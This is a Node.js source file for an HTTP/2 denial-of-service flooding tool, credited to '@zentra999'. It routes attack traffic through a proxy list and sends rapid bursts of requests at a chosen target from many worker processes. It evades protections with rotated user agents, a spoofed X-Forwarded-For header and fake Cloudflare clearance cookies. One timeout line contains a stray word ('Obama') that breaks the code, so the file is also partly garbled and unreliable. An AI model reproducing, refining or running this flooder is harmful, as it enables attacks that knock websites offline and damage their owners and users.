const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require('colors');
const os = require("os");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

if (process.argv.length < 7) {
    console.log(`@zentra999 Usage: target time rate thread proxyfile`);
    process.exit();
}

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "abcdefghijklmnopqrstuvwxyz";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const ip_spoof = () => {
    const getRandomByte = () => Math.floor(Math.random() * 255);
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const spoofed = ip_spoof();

function generateRandomPriority() {
    return Math.floor(Math.random() * 256);
}

function generateRandomString(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

const sig = [
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
];

const cplist = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256"
];

const accept_header = [
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*"
];

const lang_header = [
    'en-US',
    'ko-KR',
    'zh-CN',
    'ja-JP',
    'en-GB'
];

const encoding_header = [
    'gzip',
    'deflate',
    'br'
];

const control_header = [
    'no-cache',
    'max-age=0',
    'must-revalidate'
];

const nm = ["110.0.0.0", "111.0.0.0", "112.0.0.0"];
const nmx = ["120.0", "119.0", "118.0"];
const nmx1 = ["105.0.0.0", "104.0.0.0", "103.0.0.0"];
const sysos = ["Windows 10", "Windows 7", "Windows XP"];
const winarch = ["x86-64", "IA-32"];
const winch = ["2019 R2", "2012 R2"];

const uap = [
    generateRandomString(3,8) + "/5.0 (Windows 10; 2019 R2; x86-64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    generateRandomString(3,8) + "/5.0 (Windows 7; 2012 R2; IA-32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    generateRandomString(3,8) + "/5.0 (Windows XP; 2019 R2; x86-64) Gecko/20100101 Firefox/119.0"
];

const platformd = ["Windows", "Linux", "Mac OS"];
const rdom2 = ["hello server", "hello client", "hello world"];
const patch = ['application/json-patch+json', 'application/merge-patch+json'];
const uaa = [
    '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="99"'
];

const FA = ['Amicable', 'Benevolent', 'Ephemeral'];
const FAB = ['Aberration', 'Catalyst', 'Harmony'];
const mad = ['Resilient', 'Serendipity', 'Tranquil'];

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]) * 5,
    threads: Math.min(parseInt(process.argv[5]), os.cpus().length),
    proxyFile: process.argv[6]
};

async function checkProxy(proxy) {
    return new Promise((resolve) => {
        const [host, port] = proxy.split(":");
        const socket = net.connect(port, host, () => {
            socket.destroy();
            resolve(true);
        });
        socket.setTimeout(2000);
        socket.on("timeout", () => {
            socket.destroy();
            resolve(false);
        });
        socket.on("error", () => resolve(false));
    });
}

async function filterProxies(proxies) {
    const validProxies = await Promise.all(proxies.map(async (proxy) => {
        return (await checkProxy(proxy)) ? proxy : null;
    }));
    return validProxies.filter((proxy) => proxy !== null);
}

const parsedTarget = url.parse(args.target);

const rateHeaders = [
    { "cookie": "cf-clearance=" + generateRandomString(16,64) },
    { "origin": "https://" + parsedTarget.host + "/" },
    { "x-requested-with": "XMLHttpRequest" }
];

const rateHeaders2 = [
    { "accept-char": "UTF-8" },
    { "x-forwarded-for": spoofed }
];

const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
    console.clear();
    console.log(`HTTP-DDoS bypass by: @zentra999`.rainbow);
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.brightYellow + process.argv[2]);
    console.log(`Time: `.brightYellow + process.argv[3]);
    console.log(`Rate: `.brightYellow + process.argv[4]);
    console.log(`Thread: `.brightYellow + process.argv[5]);
    console.log(`ProxyFile: `.brightYellow + process.argv[6]);
    console.log(`--------------------------------------------`.gray);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() {}

    async HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = await net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000 Obama);
        connection.setKeepAlive(true, 120000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const path = parsedTarget.path.replace(/%RAND%/, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join(''));
const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":scheme"] = "https";
headers[":path"] = path;
headers["user-agent"] = randomElement(uap);
headers["accept"] = "*/*";
headers["accept-encoding"] = "gzip";
headers["x-forwarded-for"] = spoofed;
headers["connection"] = "keep-alive";
headers["sec-ch-ua"] = randomElement(uaa);
headers["sec-ch-ua-platform"] = randomElement(platformd);

let proxies = readLines(args.proxyFile);

async function runFlooder() {
    proxies = await filterProxies(proxies);
    if (proxies.length === 0) return;

    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100
    };

    Socker.HTTP(proxyOptions, async (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 120000);

        const tlsOptions = {
            rejectUnauthorized: false,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            socket: connection,
            ecdhCurve: "X25519",
            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384",
            secureProtocol: "TLSv1_3_method",
            ALPNProtocols: ['h2']
        };

        const tlsConn = await tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 120000);

        const client = await http2.connect(parsedTarget.href, {
            protocol: "https",
            settings: {
                headerTableSize: 8192,
                maxConcurrentStreams: 2000,
                initialWindowSize: 65535,
                maxHeaderListSize: 16384,
                maxFrameSize: 32768,
                enablePush: false
            },
            maxSessionMemory: 10000,
            createConnection: () => tlsConn,
            socket: connection
        });

        client.settings({
            headerTableSize: 8192,
            maxConcurrentStreams: 2000,
            initialWindowSize: 65535,
            maxHeaderListSize: 16384,
            maxFrameSize: 32768,
            enablePush: false
        });

        client.on("connect", async () => {
            const IntervalAttack = setInterval(async () => {
                function shuffleObject(obj) {
                    const keys = Object.keys(obj);
                    for (let i = keys.length - 1; i > 0; i--) {
                        const j = Math.floor(Math.random() * (i + 1));
                        [keys[i], keys[j]] = [keys[j], keys[i]];
                    }
                    const shuffledObject = {};
                    for (const key of keys) {
                        shuffledObject[key] = obj[key];
                    }
                    return shuffledObject;
                }

                const shuffledHeaders = shuffleObject({
                    ...headers,
                    "user-agent": randomElement(uap) + generateRandomString(5,10),
                    "referer": `https://${parsedTarget.host}/${generateRandomString(5,15)}`,
                    ...randomElement(rateHeaders),
                    ...randomElement(rateHeaders2)
                });

                const requests = Array(args.Rate).fill().map(() => {
                    const request = client.request(shuffledHeaders);
                    request.end();
                    return new Promise((resolve) => request.on("response", () => resolve()));
                });

                await Promise.all(requests);
            }, 500);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            runFlooder();
        });

        client.on("error", () => {
            client.destroy();
            connection.destroy();
            runFlooder();
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);
